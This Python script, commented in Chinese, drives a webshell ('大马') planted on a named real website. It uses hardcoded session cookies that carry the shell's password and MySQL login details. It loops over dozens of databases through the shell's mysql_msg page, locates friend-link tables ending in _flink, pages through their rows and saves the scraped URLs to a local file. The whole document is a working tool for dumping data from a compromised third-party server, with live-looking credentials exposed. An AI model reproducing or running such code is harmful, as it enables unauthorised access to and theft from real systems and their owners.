#爬取大马页面中的所有数据库中友链
#coding:utf-8
from requests_html import HTMLSession
import requests, urllib
import os
import re


session = HTMLSession()

headers={
    "cookie":"envlpass=350bfcb1e3cfb28ddff48ce525d4f139; serveru=www.gzssag.com%2Fplus%2Fimg%2Fclass.php; serverp=DD; m_eanverhost=localhost; m_eanverport=3306; m_eanveruser=shuaishuai; m_eanverpass=123456; PHPSESSID=n59ncdgqcjonjajhcnvfg7uva1"
}

def gethtml(url):
    i=0
    while i<3:
        try:
            r=session.get(url,headers=headers,timeout=5)  #请求时间5s
            return r
        except:            
            i+=1
            print('重新连接'+str(i))      # i 是数字，不能与字符串进行运算，需要使用str()转换成字符串 
    #最终请求失败返回并记录

db_list=["information_schema","a001","a002","a0025","a003","a004","a005","a006","a007","a008","a009","a011","a012","a013","a014","a015","a016","a017","a019","a021","a022","a023","a024","a026","a027","a028","a029","a030","a031","a10","a18","a20","a26","a27","a28","a32","a33","a34","a35","a36","a37","a38","a39","admin05","blogs","k0028","k025","k026","k027","k032","k033","k034","k1","k10","k11","k12","k13","k14","k15","k16","k17","k18","k19","k2","k20","k21","k22","k23","k24","k29","k3","k30","k31","k4","k5","k6","k7","k8","k9","money","mysql","performance_schema","s1","s10","s11","s12","s13","s14","s15","s16","s17","s18","s19","s2","s20","s21","s22","s23","s24","s25","s26","s27","s28","s29","s3","s30","s31","s32","s33","s34","s35","s36","s37","s38","s39","s4","s40","s41","s42","s43","s44","s45","s46","s47","s48","s49","s5","s50","s51","s52","s53","s54","s55","s56","s57","s58","s59","s6","s60","s61","s62","s63","s64","s65","s66","s67","s68","s69","s7","s70","s71","s72","s73","s74","s8","s9","shuaishuai","sss","travel","travelgame"]


for dbname in db_list:
    url_h="http://www.gzssag.com/plus/img/class.php?eanver=mysql_msg&db={}".format(dbname)
    sel='table > tr > td:nth-child(1) > a'
    r=gethtml(url_h)
    s=r.html.find(sel)
    for val in s:
        #print(val.text)
        v=val.text
        m=re.search("_flink$",v)
        if m:
            m=re.search("member_flink$",v)
            if m:   #过滤member_flink
                pass
            else:
                print(dbname+' '+v)
                sel_n='div:nth-child(7)'
                i=1
                url_flink='http://www.gzssag.com/plus/img/class.php?eanver=mysql_msg&db={}&table={}&p={}&charset='.format(dbname,v,i)
                #获取页数
                r2=gethtml(url_flink)
                s2=r2.html.find(sel_n)
                s2=s2[0].text
                n=re.findall(r'\/\d',s2)[0][1:] #取页数
                #print(n)
                n=int(n)
                #获取数据
                while i<=n:                
                    sel='table > tr > td:nth-child(4)'    
                    url_flink='http://www.gzssag.com/plus/img/class.php?eanver=mysql_msg&db={}&table={}&p={}&charset='.format(dbname,v,i)            
                    r1=gethtml(url_flink)
                    s1=r1.html.find(sel)
                    for val in s1:
                        if (val.text!='url'):
                            # print(dbname)
                            f=open('网址.txt','a',encoding='utf-8')
                            f.write(val.text+'\n')
                            f.close()
                    i=i+1
                
                
                











        




